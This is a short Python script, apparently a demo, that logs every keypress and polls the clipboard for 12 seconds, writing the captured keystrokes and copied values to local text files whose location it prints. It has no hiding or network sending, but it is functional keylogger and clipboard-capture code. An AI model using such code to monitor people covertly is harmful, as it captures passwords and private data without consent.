import pyperclip
import time
import threading
import os
from pynput.keyboard import Listener

output_dir = os.path.join(os.getcwd(), "output")
os.makedirs(output_dir, exist_ok=True)

typed_file = os.path.join(output_dir, "typed.txt")
clipboard_file = os.path.join(output_dir, "CopiedValues.txt")

copied_values = []

duration = 12  # seconds
start_time = time.time()

print("Writing files to:", output_dir)

def on_press(key):
    with open(typed_file, "a", encoding="utf-8") as fp:
        fp.write(str(key) + "\n")

def monitor_clipboard():
    while time.time() - start_time < duration:
        clipboard_value = pyperclip.paste()
        if clipboard_value and clipboard_value not in copied_values:
            copied_values.append(clipboard_value)
            with open(clipboard_file, "a", encoding="utf-8") as fp:
                fp.write(clipboard_value + "\n")
        time.sleep(3)

def start_listener():
    with Listener(on_press=on_press) as listener:
        while time.time() - start_time < duration:
            pass

clipboard_thread = threading.Thread(target=monitor_clipboard)
listener_thread = threading.Thread(target=start_listener)

clipboard_thread.start()
listener_thread.start()

listener_thread.join()
clipboard_thread.join()

print("Done.")
